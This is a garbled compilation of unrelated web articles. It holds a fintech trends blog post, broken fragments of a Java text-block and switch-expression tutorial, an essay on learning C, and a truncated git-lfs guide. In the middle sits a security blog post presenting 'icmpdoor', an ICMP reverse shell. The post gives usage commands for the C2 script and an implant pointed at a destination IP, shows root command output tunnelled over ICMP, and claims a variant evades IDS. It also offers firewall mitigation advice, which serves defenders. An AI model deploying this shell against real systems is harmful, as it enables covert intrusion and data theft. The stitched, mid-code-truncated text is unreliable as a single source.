<p><a href="https://s-pro.io/blog/how-to-build-customer-loyalty-in-digital-banking">Building Customer Loyalty in Digital Banking</a></p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2020/11/5b6b1e6389c8a12d3a8b474b.jpg" alt="" width="1100" height="956"></p>
<p><b>7. Banks are becoming more open and automated, building a distribution network</b></p>
<p><span>BaaS (Banking-as-a-service) is an industry based on open banking APIs that allow banks to lend their license and infrastructure to technology companies. Leasing banking infrastructure (license, payment processing, card issuance, compliance), instead of creating or buying it for other players, is an extremely new phenomenon but rapidly gaining momentum with the growth in the number of fintech startups.</span></p>
<p><span>We are working with a startup in Africa that recently participated in the Ecobank program. Ecobank has made a Sandbox for startups, where you can simply register, access the bank’s products (lending, card issuance, etc.), and later become a reseller of these products. The algorithm is as follows: you register a startup, register with Ecobank, receive an API for the bank’s products, integrate your product with the bank and use it. From the banks’ side the following things are happening: standardization of API, provision of platforms for product testing (Sandboxes), creation of a platform for integration, and control of their products resale process. So, such a technologically complex process is taking place.</span></p>
<p><a href="https://s-pro.io/blog/key-things-to-know-before-developing-a-mobile-only-banking-application">Key Things to Know</a> Before Developing a Mobile-Only Banking Application</p>
<p><img src="https://s-pro.io/blog/wp-content/uploads/2020/11/%D1%81%D1%82%D0%B0%D1%82%D1%82%D1%8F3_.jpg" alt="" width="2403" height="4975"></p>
<p><b>8. Strengthening automation in investment funds</b></p>
<p><span>This is a long-running story, I would say. Many investment funds offer their financial trading services not through a broker, but a program. They create a trading strategy, base the program, and the bot trades on that financial strategy. Apparently, this will intensify. Trade strategies are quite clear, as is the mechanism of their automation. And so in the future more and more players will do it.&nbsp;</span></p>
<p><span>At the same time, the entire financial market is being digitalized. If there are clear metrics that will drive the financial market (and they obviously are), then within this you can put a trading strategy in the program and trade. And this process can be correlated – to make risky strategies or not. At the same time, there is hedging, a risk insurance mechanism. A person, knowing that the bot is trading, hedges and gives % of the profits to the insurance company, which covers losses in case of bot’s loss. It’s also convenient for the investment fund because there is no need to hire additional people. Instead, they hire programmers who improve these financial strategies.</span></p>
<p><b>9. Growing demand for expertise in software development: working with Big data and high-load systems</b></p>
<p><span>Fintech companies need to work closely with developers, designers, and technicians to ensure that all new ideas and concepts are properly implemented.</span></p>
<p><span>After all, this is the industry with high-load projects, so it needs expertise in Big data or high load systems. There are many analytics and data preservation issues because it’s working with financial information. How will this affect the outsourcing and software development market? First of all, people with the right thinking approach are needed, because fintech has a demand for transformation. </span><span>Transformation is about people who can think differently</span><span>. Secondly, there is a request for quality service.&nbsp;</span></p>
<p><span>Summing up, I think that outsourcing companies need to hire the right people, focus on project management, and there must be a clear delivery mechanism. And for sure, it is extremely important to ensure a sufficient level of security.</span></p>
<h3><i><span>“Transformation is about people who can think differently</span></i><span>.”</span></h3>
<p><a href="https://s-pro.io/blog/things-we-learned-machine-learning-prague-2019">What Things We’ve Learned</a> at Machine Learning Prague 2019</p>
<p><b>10. Pandemic adaptation: remote presence and localization</b></p>
<p><span>Two contexts are emerging against the background of the COVID-19 pandemic. The first one is the </span><i><span>localization</span></i><span> of people in their work, especially in their offline activity. If before everything was moving towards globalization, now there is a trend of remote work and presence, including financial management. The second one is that companies need to work online and interact with their customers and employees remotely. At the same time, they need to have some local presence and to improve the customer experience for all their clients with an emphasis on </span><i><span>remote work</span></i><span>.&nbsp;</span></p>
<p><span>Microsoft conducted a </span><a href="https://news.microsoft.com/europe/features/flexible-ways-of-working-are-here-to-stay-finds-new-european-research-with-leaders-focused-on-maintaining-culture-and-innovation/"><span>survey</span></a><span> of 9,000 employees and business leaders in 15 European countries to learn about their remote experience and future expectations. The changes have been significant: if last year only 15% of companies had a flexible work schedule, now 76% work that way. It turned out that even after the pandemic, neither managers nor employees want to return to the old ways of doing business.</span></p>
<p><span>According to the study, Microsoft has developed guidelines for employers seeking to unleash the full potential of remote teams and teams with mixed work schedules. You can find more information in the Microsoft </span><a href="https://news.microsoft.com/europe/features/flexible-ways-of-working-are-here-to-stay-finds-new-european-research-with-leaders-focused-on-maintaining-culture-and-innovation/"><span>blog</span></a><span>.</span></p>
<p><a href="https://s-pro.io/blog/coronavirus-business-impact">Coronavirus for businesses:</a> a disaster or a tremendous opportunity?</p>
<h3><b>Conclusion</b></h3>
<p><span>In summary, let’s systematize the forecasting trends separately for B2B and B2C.&nbsp;</span></p>
<p><span>Most of the B2B products we make are data products when the data from one company are transferred to another one. In the field of lending, for example, it is the scoring of loans and their resale. I can say that the big fintech trend in 2021 for B2B is the development of products that provide data analysis.</span></p>
<p><span>According to B2C, it’s the digitization of banking services for the population, mobile banking and hybrid services to improve the customer experience. The big fintech trend in 2021 for B2C is the development of various customer experience products, onboarding products, and KYC-services.</span></p>
<p><span>Even after life returns to its usual, “non-pandemic” state, some of the behaviours started by the pandemic will continue, including those that intersect with financial technology. And this is for the better because the crisis has forced the industry to adapt to new conditions, look for new opportunities to reach users, and thus – to provide them with more comfort and benefits from the use of fintech products.</span></p>

<span>html</span> <span>+=</span> <span>"&lt;html&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"  &lt;body&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"    &lt;p&gt;Hello, world&lt;/p&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"  &lt;/body&gt;\n"</span><span>;</span>
<span>html</span> <span>+=</span> <span>"&lt;/html&gt;\n"</span><span>;</span>

<span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>html</span><span>);</span>
</code></pre></div></div> <p>To make this situation more programmer-friendly, Java 15 introduced multi-line string literals called Text Blocks:</p> <div><div><pre><code><span>String</span> <span>html</span> <span>=</span> <span>"""
          &lt;html&gt;
            &lt;body&gt;
              &lt;p&gt;Hello, world&lt;/p&gt;
            &lt;/body&gt;
          &lt;/html&gt;
          """</span><span>;</span>

<span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>html</span><span>);</span>
</code></pre></div></div> <p>They are similar to the old String literals but they can contain <strong>new lines and quotes without escaping</strong>.</p> <p>Text Blocks start with <code>"""</code> followed by a new line, and end with <code>"""</code>. The closing token can be at the end of the last line or in separate line such as is in the example above.</p> <p>They can be used anywhere an old String literal can be used and they both produce similar String objects.</p> <p>For each line-break in the source code, there will be a <code>\n</code> character in the result.</p> <div><div><pre><code>String twoLines = """
          Hello
          World
          """;
</code></pre></div></div> <p>This can be prevented by ending the line with the <code>\</code> character, which can be useful in case of very long lines that you’d like to split into two for keeping the source code readable.</p> <div><div><pre><code>String singleLine = """
          Hello \
          World
          """;
</code></pre></div></div> <p>Text Blocks can be aligned with neighboring Java code because <strong>incidental indentation is automatically removed</strong>. The compiler checks the whitespace used for indentation in each line to find the least indented line, and shifts each line to the left by this minimal common indentation.</p> <p>This means that if the closing <code>"""</code> is in a separate line, the indentation can be increased by shifting the closing token to the left.</p> <div><div><pre><code><span>String</span> <span>noIndentation</span> <span>=</span> <span>"""
          First line
          Second line
          """</span><span>;</span>

<span>String</span> <span>indentedByToSpaces</span> <span>=</span> <span>"""
          First line 
          Second line
        """</span><span>;</span>
</code></pre></div></div> <p>The opening <code>"""</code> does not count for the indentation removal so it’s not necessary to line up the text block with it. For example, both of the following examples produce the same string with the same indentation:</p> <div><div><pre><code>String indentedByToSpaces = """
         First line 
         Second line
       """;

String indentedByToSpaces = """
                              First line 
                              Second line
                            """;
</code></pre></div></div> <p>The <code>String</code> class also provides some programmatic ways to deal with indentation. The <code>indent</code> method takes an integer and returns a new string with the specified levels of additional indentation, while <code>stripIndent</code> returns the contents of the original string without all the incidental indentation.</p> <p>Text Blocks do not support interpolation, a feature I really miss. As the JEP says it may be considered in the future, and until then we can use <code>String::formatted</code> or <code>String::format</code>:</p> <div><div><pre><code><span>var</span> <span>greeting</span> <span>=</span> <span>"""
    hello
    %s

It’s important though to use <strong>consistent indentation</strong> for each line in the block, otherwise the incidental indentation can’t be removed.</p> <p>Most editors offer autoformatting and automatically add indentation on each new line when you hit enter. Make sure to use the latest version of these tools to ensure they play well with Text Blocks, and don’t try to add wrong indentations.</p> <h2 id="helpful-nullpointerexceptions">Helpful NullPointerExceptions</h2> <p><strong>Available since:</strong> <a href="https://bugs.openjdk.java.net/browse/JDK-8233014">JDK 15</a> (Enabled with <code>-XX:+ShowCodeDetailsInExceptionMessages</code> in <a href="https://openjdk.java.net/jeps/358">JDK 14</a>)</p> <p>This little gem is not really a language feature, but it’s so nice that I wanted to include it in this list.</p> <p>Traditionally, experiencing a <code>NullPointerException</code> was like this:</p> <div><div><pre><code><span>node</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>"name"</span><span>).</span><span>item</span><span>(</span><span>0</span><span>).</span><span>getChildNodes</span><span>().</span><span>item</span><span>(</span><span>0</span><span>).</span><span>getNodeValue</span><span>();</span>

</code></pre></div></div> <p>From the exception it’s not obvious which method returned null in this case. For this reason many developers used to spread such statements over multiple lines to make sure they’ll be able to figure out which step led to the exception.</p> <p>From Java 15, there’s no need to do that because NPE’s describe which part was null in the statement. (Also, in in Java 14 you can enable it with the <code>-XX:+ShowCodeDetailsInExceptionMessages</code> flag.)</p> <div><div><pre><code><span>Exception</span> <span>in</span> <span>thread</span> <span>"main"</span> <span>java</span><span>.</span><span>lang</span><span>.</span><span>NullPointerException</span><span>:</span>

For example, when an NPE is thrown on the remote code executed via RMI, the exception will not include the helpful message.</p> <p>Currently the <strong>Helpful NullPointerExceptions are disabled by default</strong>, and have to be enabled with the <code>-XX:+ShowCodeDetailsInExceptionMessages</code> flag.</p> <h3 id="️-tip-check-your-tooling">⚠️ Tip: Check your tooling</h3> <p>When upgrading to Java 15, make sure to check your application and infrastructure to ensure:</p> <ul> <li>sensitive variable names not end up in log files and web server responses</li> <li>log parsing tools can handle the new message format</li> <li>the additional overhead required to construct the additional details is okay</li> </ul> <h2 id="switch-expressions">Switch Expressions</h2> <p><strong>Available since:</strong> <a href="https://openjdk.java.net/jeps/361">JDK 14</a> (Preview in <a href="https://openjdk.java.net/jeps/325">JDK 12</a> <a href="https://openjdk.java.net/jeps/354">JDK 13</a>)</p> <p>The good old <code>switch</code> got a facelift in Java 14. While Java keeps supporting the old <a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/switch.html">switch statement</a>, it adds the new <strong>switch expression</strong> to the language:</p> <div><div><pre><code><span>int</span> <span>numLetters</span> <span>=</span> <span>switch</span> <span>(</span><span>day</span><span>)</span> <span>{</span>

<span>};</span>
</code></pre></div></div> <p>The most striking difference is that this new form <strong>can be used as an expression</strong>. It can be used to populate variables as demonstrated in the example above, and it can be used wherever an expression is accepted:</p> <div><div><pre><code><span>int</span> <span>k</span> <span>=</span> <span>3</span><span>;</span>

    <blockquote>
  <p>"Is C good as first language?" "Is&nbsp;there still future with C?"
"Why should I even bother with C?" "C is old!" …</p>
</blockquote>

<p>Have you heard such words? Well, I have. Countless of times, be it
in direct conversation or on a forum. The response is, as always, "it depends",
but in my humble opinion learning C is really valuable experience.</p>

<p>In this not too long text I hope to show you what I think makes C great.</p>

<h3 id="spirit-of-c">Spirit of C</h3>

<p>Let's start with a quote from document <a href="http://www.open-std.org/jtc1/sc22/wg14/www/C99RationaleV5.10.pdf">C99RationaleV5.10</a>:</p>

<blockquote>
  <p>The C89 Committee kept as a major goal to preserve the traditional spiritof C.
There are many facets of the spirit of C, but the essence is a community
sentiment of the underlying principles upon which the C language is based.
Some of the facets of the spirit of C can be summarized in phrases like:</p>
  <ul>
    <li><em>Trust the programmer.</em></li>
    <li><em>Don’t prevent the programmer from doing what needs to be done.</em></li>
    <li><em>Keep the language small and simple.</em></li>
    <li><em>Provide only one way to do an operation.</em></li>
    <li><em>Make it fast, even if it is not guaranteed to be portable.</em></li>
  </ul>
</blockquote>

<p>Above points directly relate to what I will talk further in the article.</p>

<h3 id="mid-level">"Mid-level"</h3>

<p>In regards of level, there are two types of languages: low and high.</p>

<p>Low-level languages are close to the hardware, the only closer thing to CPU
would be electricity itself. Those languages are divided into machine code and
Assembly. The former is a stream of raw, usually binary, data. If somebody is
required to work with it, usually does it using more "readable" hexadecimal form.</p>

<p>Second-generation languages - Assembly - provide one abstraction level on top
of the machine code. Those languages are mostly only a mapping of human-readable
symbols, including symbolic addresses, to opcodes, addresses, numeric constants,
strings and so on. Also are different for each processor.</p>

<p>How do high-level languages, providing more abstraction, compare? Quoting Wikipedia:</p>

<blockquote>
  <p>In contrast to low-level programming languages, it may use natural language
elements, be easier to use, or may automate (or even hide entirely) significant
areas of computing systems (e.g. memory management), making the process of
developing a program simpler and more understandable than when using a
lower-level language. The amount of abstraction provided defines how
"high-level" a programming language is.</p>
</blockquote>

<p>In short: low = more machine friendly, high = more human friendly.</p>

<p>C is high-level, but back when it was created, most of the work was still being
done in low-level Assembly. As a result, C has lower level of abstraction than
other (still) widely used languages, hence I like to call it "mid-level".</p>

<p>You can also easily (with less language bloat) compile C code to Assembly
instead to binary and examine what instructions CPU will execute.</p>

<p>And if it there is a need, popular C compilers offers you the option in C level
down and use inline Assembly to squeeze everything out of CPU. Not really many
other languages implement such a thing.</p>

<h3 id="fairly-simple">Fairly simple</h3>

<p>Low-level languages are harder to program in. Not because they are more complicated,
but because they are more error prone and thus require way more commitment,
memorizing and fiddling.</p>

<p>C is mid-level, so "by definition" it's easier. But there comes the surprise,
learning it is easier compared to higher level languages. Why? Because of really
simple syntax and <a href="https://en.wikipedia.org/wiki/Structured_programming">structured paradigm</a>
(don't confuse with <code>struct</code>!). It doesn't take so much to learn the basics.
Loops, functions, structures, pointers, variables, types - the core of language.
Intense week to get the general idea. The rest is "just" maths and CS theorem.</p>

<p>But, but, but, but! Don't get me wrong! To master anything you will
need a lot more practice! <strong>A lot!</strong> And it's truth for anything out there!</p>

<h3 id="fast-and-lightweight">Fast and lightweight</h3>

<p>Standard C library is small compared to other languages (e.g Java). It's small
enough for you to try to memorize all functions successfully (not that it would
be a huge benefit). Yeah, many things should be deprecated long ago, there
obviously is some bloat (try to maintains something without bloat for few years,
let alone few decades), but there is not much enough of it to hinder the performance.</p>

<p>And what if libc is still too much? Nothing stands in the way of not using it
at all. Just don't include any of its headers - not even simple <code>printf()</code> will
be present. Replace it with any other library of your choice.</p>

<p>Maturity, emphasis on proper memory management, inline Assembly, small abstraction
and little bloat gives programmer really good control over the program.</p>

<p>This makes C an ideal choice for OS kernels (Linux, Windows NT or macOS's XNU to
name a few) or other languages (e.g. Python). That's also why C is so popular
on embedded systems, where you cannot afford to waste resources.</p>

<h3 id="ubiquity--portability">Ubiquity = portability</h3>

<p>Does there exist any (still) significant platform with no C compiler available?
Except for those which run only Assembly, I've never heard about one.
C programs are present on your high-end gaming PC, on NASA spacecrafts and
in ticket machines. Literally everywhere. C software runs the world.</p>

<p>In accordance to previous paragraphs, C is peculiarly strong choice for
microcontrollers and other forms of embedded systems, which surround us every day.</p>

<p>And have you heard about <a href="https://en.wikipedia.org/wiki/Foreign_function_interface">FFI</a>?
Turns out many other languages like to have some kind of compatibility with C.</p>

<p>You don't need to worry if you will be able to use this language somewhere as
for 99% you can! (Although it doesn't mean you should…) It means, that while
code may not be 100% portable, you will be a portable programmer.</p>

<h3 id="the-influencer">The influencer</h3>

<p>C has both directly and indirectly influenced innumerous amount of languages.
C++, Java, Go, D, Rust, Perl, even PHP and Python - those are but few examples.</p>

<p>Obviously, knowledge of C isn't needed to learn any of them and sometimes
may even push you to use not the best practices.</p>

<p>Nevertheless, I think it's important to remember the roots. And if you are
cautious, familiarity with C might give you some foothold. It's especially the
case with C++.</p>

<h3 id="rich-collection-of-libraries">Rich collection of libraries</h3>

<p>I suspect all this talk about fastness, lightness, mid-level, Assembly etc. might
have give you an idea, you will need to implement everything yourself. There may
be not any <a href="https://docs.oracle.com/javase/8/docs/api/java/util/LinkedHashMap.html"><code>LinkedHashMap</code></a>
like in Java or other or other functionality like garbage collector…
True, true, except…  not entirely.</p>

<p>C is mature and popular language. Name a thing and believe me, somebody somewhere
already created library for it (although if think about something too obscure,
you won't find it for all the world, but it does exists).</p>

<p>You want garbage collector? <a href="https://www.hboehm.info/gc/">Boehm GC</a> has you covered.
TUI? Nothing like timeless <a href="https://invisible-island.net/ncurses/">ncurses</a>.
Examples can be listed almost infinitely:

<a href="https://mupdf.com/">MuPDF</a>,
<a href="https://www.openssl.org/">OpenSSL</a>…</p>

<p>It's very universal language - you can program basically anything: web server,
video game (e.g. <a href="https://github.com/id-Software">classics from <em>id Software</em></a>),
operating system, other programming language or wrapper forcing Firefox to obey
<a href="https://wiki.archlinux.org/index.php/XDG_Base_Directory">XDG Base Directory specification</a>,
because when I'm an administrator, the programs will do exacly what I told them to!</p>

<p>However, please, remember - the fact you can, doesn't mean you should. For example,
if you want to create a video game, you really ought to turn your eyes to C++.
And you should know, that…</p>

<h3 id="c-is-highly-backward-compatible">C++ is highly backward compatible</h3>

<p>Why do I even make the whole point out of C++ here? Because it's one of most
widely used languages today and you encountering it is more than certain.</p>

<p>In contrary to other languages embracing C compatibility, C++ was created as its
direct descendant and committee goes to great lengths to keep the "copy-paste"
compatibility with it - in most cases you can compile C code as C++ just fine.</p>

<p>Don't be mistaken, C++ isn't by any means a superset of C - the code isn't always
going to work with C++ and a good C code isn't necessary good C++ code. Consider example:</p>
<div><div><pre><code><span>int</span><span>*</span> <span>x</span> <span>=</span> <span>malloc</span><span>(</span><span>10</span> <span>*</span> <span>sizeof</span><span>(</span><span>*</span><span>x</span><span>));</span>
</code></pre></div></div>
<p>Proper way in C, but in C++ there ought to be <code>(int*)</code> before <code>malloc()</code>,
for it to work, not to mention you should use <code>new int[10]</code> instead.</p>

<p>Although in most cases you can use C library safely in your C++ project.</p>

<p>All examples from the previous point not only <strong>can be</strong>, but <strong>often are</strong>
used in such way. E.g. I myself used <em>ncurses</em> in my C++ code for hex editor
<a href="https://joren.ga/bym/">Bym</a>.</p>

<p>Even libraries already compiled with C compiler can be made compatible with C++,
thanks to <a href="https://en.cppreference.com/w/cpp/language/language_linkage"><code>extern "C"</code></a>
linkage specifier.</p>

<h3 id="a-blot-on-the-landscape">A blot on the landscape…</h3>

<p>C was created in year 1972 on the foundation of B language, so over the years
it acquired some quirks (<code>memcpy()</code> is defined in string header!), some things
became obsolete, some useless and are kept only for compatibility with old code.</p>

<p>A beginner is likely to burn a lot of time chasing down strange behavior caused
by memory corruption with no idea how to reason about, what may lead actually
big discouraged to programming in general. There is little to none mechanism
to prevent programmer from shooting themselves in the foot.</p>

<p>It's also important to take into account that C is not the introduction to
Computer Science. Learning none of languages is. You need to study it properly
to get a true understanding of this vast field. If not formal education in
university, then online one will be good too. The Internet is full of resources,
some can be found on my <a href="https://joren.ga/urlsList/">list of URLs</a>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Learning C is valuable experience and it's worth it. If not as your first
language, then as second, third, fourth or whatever. There are a lot of advantages,
but also some disadvantages. At least trying won't hurt. Give it a chance, who
knows, you may truly get to like it, just like me.</p>

<p>And don't believe people saying "C is dead" or "It will soon be replaced"
(I'm looking at you Rust fans). C is fine and will be relevant for few next decades too.
Heck! COBOL, nearly forgotten, yet there are still job openings! How is C supposed
to become obscure when, in the moment I write those words, there is planned new
standard …</p></div></div>

<p>
ICMP is mainly used to ping computers and appliances across networks. This blog post explains why leaving ICMP unfiltered by a corporate and host-based firewall can form a bigger risk than you might initially think. Our ICMP reverse shell called icmpdoor can tunnel out a covert channel to control a compromised machine and exfiltrate data as an insider threat. Your Anti-Virus (AV) will most likely not detect and block icmpdoor either. This ICMP reverse shell works both on Linux and Windows 10.</p>

<h2>Reverse Shell</h2>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell" target="_blank">A reverse shell</a> is a remote interactive shell for command execution initiated by the attacker to gain control over a compromised system. A reverse shell can also be abused by an insider threat to exfiltrate data over this covert channel. Corporate edge and core firewalls are typically configured to filter/deny/block TCP and UDP ports, or ever specific applications (layer 7 firewalling). Figure 1 shows how a well-configured firewall should block a traditional TCP or UDP reverse shell:</p>

<p><img src="https://cryptsus.com/blog/tcp-reverse-shell.jpg" title="tcp-reverse-shell" alt="tcp-reverse-shell" height="155" width="750"><br>
Figure 1: Firewall blocks reverse shell over port 4444</p>

<h2>ICMP Reverse Shell</h2>
<p>ICMP stands for Internet Control Message Protocol. This protocol is often overlooked or depreciated when planning a firewall strategy. ICMP firewall filtering is rarely configured which allows malicious actors to evade firewalls. Abusing ICMP as a backdoor has been done by <a href="https://cptofevilminions.github.io/Network_based_MITRE_ATTACK_matrix/techniques/command_and_control/icmp" target="_blank">at least one APT (Advanced Persistent Threat) group in the past</a>. Blocking the ICMP protocol completely would also imply hosts can no longer ping each other.</p>

<p>I decided to write my own ICMP reverse shell called <a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> in Python 3 since I could not find a proper alternative. This ICMP reverse shell tunnel works on most, if not all, Linux distributions and Windows 10 as long as you can ping from Machine A to Machine B.</p>

<h2>ICMP deep dive</h2>
<p>We first analyze a traditional ping. Typically a ping echo-request (type 8) is sent and expect a ping echo-reply (type 0) in return. Code block 1 shows us the <a href="https://tools.ietf.org/html/rfc792" target="_blank">RFC 792 ICMP echo-request and echo-reply packets header</a>.</p>

<pre><code>0                   1                     2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier (ID)     |        Sequence Number        |

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>
<p>Code block 1: ICMP echo-request and echo-reply packet headers</p>

<p>The optional ICMP Data field is normally used for error messaging. However, instead of an error message, we will abuse this data field for our reverse shell payload (Raw) which can be a maximum of 576 bytes in size. We will fragment the payload if the total size exceeds this maximum of 576 bytes.</p>

<p>We also modify and abuse the ICMP Identifier field to a static value of 13170 in order to filter out legitimate ICMP packets and match our ICMP reverse shell. In total we filter/manipulate the following header fields:
</p><p><b>1)</b> <span>pkt[IP].src</span> (IP address of machine A or B)</p>
<p><b>2)</b> <span>ip[ttl]</span> (Time To Live == 64)</p>
<p><b>3)</b> <span>pkt[ICMP].type</span> (Echo Request [8] or Echo Reply [0])</p>
<p><b>4)</b> <span>pkt[ICMP].id</span> (Static Identification (ID) field with value 13170 == 0x3372 in hexadecimal)</p>
<p><b>5)</b> <span>pkt[Raw].load</span> (Payload ≠ empty)</p>

<p>Figure 2 shows all the packet encapsulation layers and their values when we send the Linux command <span>id</span>. with a reply <span>uid=0(root) gid=0(root) groups=0(root)</span>. <a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> is encapsulated in the following network packets: <span>MAC[IP[ICMP(payload)]]]</span></p>
<p><img src="https://cryptsus.com/blog/packet-headers.jpg" title="icmp-reverse-shell-packet-headers" alt="icmp-reverse-shell-packet-headers" height="450" width="650"><br>
Figure 2: ICMP packet header</p>

<p>The Python 3 <a href="https://scapy.net/" target="_blank">Scapy</a> module helps us manipulate network fields. Figure 3 shows the connection flow followed in a Command &amp; Control (C2) setup:</p>

<p><img src="https://cryptsus.com/blog/icmp-reverse-shell.jpg" title="icmp-reverse-shell" alt="icmp-reverse-shell" height="155" width="750"><br>
Figure 3: imcpdoor Command &amp; Control (C2) execution over ICMP</p>

<p><a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmp-cnc.py</span></a> runs on Machine A while <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor.py</span></a> or <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor.exe</span></a> runs on Machine B.</p>

<p><b>1)</b> The attacker sends a command e.g. <span>hostname</span> as payload over ICMP echo-request (code 8) with ICMP ID 13170.
</p><p><b>2)</b> The victim executes strips of the network packets and executes command <span>hostname</span> with <span>os.popen</span>.
</p><p><b>3)</b> The victim sends the output of the <span>hostname</span> command <span>ubuntu2040</span> back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170. </p>

<p><a href="https://github.com/krabelize/icmpdoor" target="_blank">icmpdoor</a> does not time-out automatically because it does not establish a socket. Instead, this reverse shell is connectionless due to the nature of how the ICMP protocol works. This technique works with global routable IP's (WAN connections).</p>

<p>You can pull <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> <a href="https://github.com/krabelize/icmpdoor" target="_blank">from my GitHub repository</a>. Pre-compiled stand-alone binaries for Windows 10 and Linux are also available from the <a href="https://github.com/krabelize/icmpdoor" target="_blank">same repo</a>.</p>

<p>Usage:</p>
<pre><code>./icmp-cnc.py -i INTERFACE -d DESTINATION_IP (Command &amp; Control (C2))
./icmpdoor.py -i INTERFACE -d DESTINATION_IP (Implant)
</code></pre>

<p>Do note that this ICMP reverse shell is unencrypted and does not use (base64) encoding:</p>
<pre><code>$ shell: id
0000  00 0C 29 61 10 78 00 0C 29 B8 E9 F9 08 00 45 00  ..)a.x..).....E.

0020  B2 47 00 00 16 51 33 72 00 00 75 69 64 3D 30 28  .G...Q3r..uid=0(
0030  72 6F 6F 74 29 20 67 69 64 3D 30 28 72 6F 6F 74  root) gid=0(root
0040  29 20 67 72 6F 75 70 73 3D 30 28 72 6F 6F 74 29  ) groups=0(root)
0050  0A
</code></pre>

<h2>Mitigation</h2>
<p>Network administrators and security engineers should limit or deny ICMP traffic as much as possible. When this is not feasible due to protocol requirements or network planning, scope the accepted source and destination of ICMP packets. <a href="https://cryptsus.com/blog/advanced-perimeter-based-iptables-firewall-on-linux.html" target="_blank">This blog post elaborates on how to configure this with iptables</a>.</p>

<p>Always take the scenario of lateral movement into account when you are planning network segmentation and configuring firewall settings. Lateral movement is a technique used by malicious actors after gaining initial access, to progressively move further into a domain, network or infrastructure. This means isolation of assets and firewall filters are only limited to the scope of a certain level.</p>

<p>Firewalls and gateways can also rate-limit ICMP packets. However, this control is mostly used to mitigate DDoS attacks and would imply ICMP-based data exfiltration is only slowed down.</p>

<p>DPI (Deep Packet Inspection) and IPS (Intrusion Prevention System) solutions such as <a href="https://zeek.org/" target="_blank">Zeek</a> and <a href="https://www.snort.org/" target="_blank">Snort</a> or next-gen firewalls could possibly detect this ICMP tunnel due to the presence of the (plain-text) payload and static ID value. We have a modified version of <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> we use for client engagements which does not get detected by these IDS/IPS systems.</p>

<p>You can also configure the TTL (Time To Live) <a href="https://www.netresec.com/?page=Blog&amp;month=2011-11&amp;post=Passive-OS-Fingerprinting" target="_blank">according to the expected Operating System (OS) of the victim</a>. <a href="https://github.com/krabelize/icmpdoor" target="_blank"><span>icmpdoor</span></a> uses a TTL value of 64 which is the default for most Linux distributions. Windows uses a TTL value of 128, while network appliances usually have a TTL of 255.</p>

<h2>Screenshots</h2>

    <div><p id="907bc591-58b8-48fe-91c9-bfb7e0d06966"><strong>The situation:</strong> A project has several binaries that need to be tracked and versioned along with the code. The binaries are small enough and rarely change, so versioning them directly in git is appropriate.</p><p id="2fee7b63-0896-4010-9121-a47da3d687af">That was some months ago, and in the meantime, the project evolved, binaries grew and changed. Now you're left with a bloated repository of multiple gigabytes that takes a long time to clone. This is significantly slowing down the CI pipeline and it's time to fix it.</p><h2 id="6a23a05c-f86a-44fc-8c27-1a6fd0debdec">Dealing with symptoms directly</h2><p id="4d799a62-5fcf-48b8-b398-24de358368ae">There are many options to solve this problem, all with unique pros and cons. The simplest solution is dealing only with problematic symptoms like slow CI pipeline. This can be overcome with one of the following:</p><ul id="a4d928e3-99ad-4c47-8e1e-00b7fe1b5ea9"><li>Shallow clone <code>git clone --depth 1 URL</code>: Limiting the depth of the clone means that the history is not pulled. </li></ul><ul id="bbad9cea-fc88-4976-bd08-5786bcaeb16e"><li>Clone without binary files <code>git clone --filter=blob:none URL</code>: The filter option is more powerful and can be used filter only specific files that meet specific criteria. See <a href="https://github.com/git/git/blob/d98273ba77e1ab9ec755576bc86c716a97bf59d7/Documentation/rev-list-options.txt#L869">docs</a>.</li></ul><ul id="ac2c38f0-fc62-4ded-be0f-e3410dfb99c3"><li>Finally, if the large binary file size is not your problem but the large number of files, you should look into <code>git sparse-checkout</code>. See <a href="https://git-scm.com/docs/git-sparse-checkout">docs</a>.</li></ul><p id="42b388e0-b311-4a54-8629-847c1966834f">But sometimes these workarounds are not enough and you need to rewrite the repo history. Below I will discuss the two solutions that should cover most of the usecases. The first option is  migrating to the <code>git lfs</code>. The second option is pruning the binaries from the repo history using <code>git filter-repo</code> and versioning the binaries in a separate versioning system.</p><h2 id="95da721f-0685-4fd3-b43c-7862ef86cb85">Migrating to <code>git lfs</code></h2><p id="2f6b6dd0-0b0d-4183-bb39-00efca470d21">The main advantage of the migration to <code>git lfs</code> is that the repo history is left intact and no information is lost. This method is recommended when the binaries are really tightly coupled with the code. This is easily done with the following steps:</p><ul id="7a4486db-1bb5-4f5e-bb14-8302fe5b5d7e"><li>Install the git-lfs using this <a href="https://github.com/git-lfs/git-lfs/wiki/Installation">guide</a> or in conda like so:
<code>conda install -c conda-forge git-lfs</code></li></ul><ul id="136e92fe-b98f-40ec-990b-4c213d4a09cb"><li>In your repo, run: <code>git lfs install</code></li></ul><ul id="c37e7873-1352-4e38-9276-4ed2bfa38eb8"><li>Rewrite history. For example migrating all bz2 files:
